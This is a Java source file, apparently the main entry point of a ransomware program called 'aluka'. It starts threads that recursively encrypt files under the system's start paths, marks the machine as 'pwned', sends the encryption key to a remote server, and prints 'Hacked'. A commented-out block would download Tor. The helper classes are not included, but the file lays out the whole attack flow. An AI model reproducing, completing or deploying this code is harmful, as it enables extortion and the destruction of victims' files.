package aluka;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;

import aluka.configuration.Configuration;
import aluka.core.ClientServerManager;
import aluka.core.FileDeeperBrowser;
import aluka.core.LoggerManagement;
import aluka.core.StateManager;
import aluka.core.SystemManager;

/**
 * Hello world!
 *
 */
public class App 
{
public static final String MODE = "POWERED";
	
	public static void main(String[] args) {
		
		LoggerManagement logger = LoggerManagement.getInstance();
		SystemManager system = new SystemManager();
		StateManager stateManager = StateManager.getInstance();
		
		/*if(MODE.equals("POWERED")) {
			Thread thread = new Thread(new DownloadTor(system.getOsType()));
			thread.start();
		}*/
	
		if (!stateManager.isPwned()) {
			
			//Starting Encryption for files
			logger.log(Level.WARNING,"Lauching Encryption Process");
			List<Thread> threads = new ArrayList<>();
			for (String path : system.getStartPath()) {
				logger.log(Level.INFO,"Lauching Encryption for " + path);
				Thread thread = new Thread(new FileDeeperBrowser(path, system.getCallback()));
				thread.start();
				threads.add(thread);
			}
			Configuration.waitForThreads(threads,"Wating for file to be encrypted");
			stateManager.markPwned();
			
			//Export Key
			ClientServerManager myserver = new ClientServerManager(Configuration.getSimpleConnexion());
			myserver.exportKey();
			stateManager.markExported();
		} else {
			if (!stateManager.isExported()) {
				//Export Key
				ClientServerManager myserver = new ClientServerManager(Configuration.getSimpleConnexion());
				myserver.exportKey();
				stateManager.markExported();
			}else {
				System.out.println("Hacked");
			}
		}
	
	}
}
